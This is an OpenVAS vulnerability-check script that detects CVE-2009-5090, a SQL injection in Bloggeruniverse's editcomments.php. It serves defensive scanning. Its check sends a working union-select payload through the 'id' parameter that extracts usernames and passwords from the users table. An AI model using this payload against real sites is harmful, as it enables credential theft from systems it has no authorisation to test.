###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_bloggeruniverse_sql_injection_vuln.nasl 7029 2017-08-31 11:51:40Z teissa $
#
# Bloggeruniverse 'editcomments.php' SQL Injection Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902632");
  script_version("$Revision: 7029 $");
  script_tag(name:"last_modification", value:"$Date: 2017-08-31 13:51:40 +0200 (Thu, 31 Aug 2017) $");
  script_tag(name:"creation_date", value:"2011-09-27 17:29:53 +0200 (Tue, 27 Sep 2011)");
  script_cve_id("CVE-2009-5090");
  script_bugtraq_id(33744);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Bloggeruniverse 'editcomments.php' SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/8043/");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/48697");

  script_copyright("Copyright (c) 2011 SecPod");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation will let attackers to manipulate SQL
  queries by injecting arbitrary SQL code.

  Impact Level: Application");
  script_tag(name : "affected" , value : "Bloggeruniverse version 2 Beta.");
  script_tag(name : "insight" , value : "The flaw is due to input passed via the 'id' parameter to
  'editcomments.php' is not properly sanitised before being used in SQL queries.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "summary" , value : "The host is running Bloggeruniverse and is prone to sql injection
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Check for each possible path
foreach dir (make_list_unique("/bloggeruniverse", "/blog", "/bg", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  ## Send and Receive the response
  rcvRes = http_get_cache(item: dir + "/index.php", port:port);

  if("Bloggeruniverse" >< rcvRes && "CopyRight &copy;" >< rcvRes)
  {
    ## Construct the Attack Request
    url = dir + "/editcomments.php?id=-2%20union%20all%20select%201,2,3,4,5" +
             ",6,concat(0x4f70656e564153,0x3a,username,0x3a,password,0x3a,0" +
             "x4f70656e5641532d53),8%20from%20users";

    if(http_vuln_check(port:port, url:url, pattern:">openVAS:(.+):(.+):openVAS"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);